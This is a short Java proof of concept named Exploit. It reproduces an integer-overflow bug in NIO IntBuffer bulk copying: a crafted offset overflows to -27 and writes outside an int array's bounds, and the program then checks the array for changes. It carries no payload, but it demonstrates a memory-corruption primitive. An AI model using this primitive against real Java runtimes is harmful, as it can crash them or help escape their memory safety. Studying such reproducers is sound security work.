import java.nio.*;

public class Exploit {
  public static void main(String[] args) {

    long heapSize = Runtime.getRuntime().totalMemory();
    //Print the jvm heap size.
    System.out.println("Heap Size = " + heapSize);

    int[] dst = new int[1200000000];
    for (int i = 0; i < dst.length; i++) {
      dst[i] = 0xAAAAAAAA;
    }

    int bytes = 400;
    ByteBuffer bb = ByteBuffer.allocateDirect(bytes);
    IntBuffer ib = bb.asIntBuffer();

    for (int i = 0; i < ib.limit(); i++) {
      ib.put(i, 0xBBBBBBBB);
    }

    int offsetOK = 10; // just 10
    int offsetBroken = 1073741817; // offset << 2 = -27
    int length = 2;

    ib.get(dst, offsetOK, length);
    // modifies in-bounds at index 10
    for (int i = 0; i < dst.length; i++) {
        if (dst[i] != 0xAAAAAAAA) {
            System.out.println(Integer.toString(i) + " index modified! This should show!");
        }
    }

    for (int i = 0; i < dst.length; i++) {
      dst[i] = 0xAAAAAAAA;
    }

    ib.get(dst, offsetBroken, length);
    // modifies out of bounds at index -27
    for (int i = 0; i < dst.length; i++) {
        if (dst[i] != 0xAAAAAAAA) {
            System.out.println(Integer.toString(i) + " index modified! This should not show!");
        }
    }
  }
}
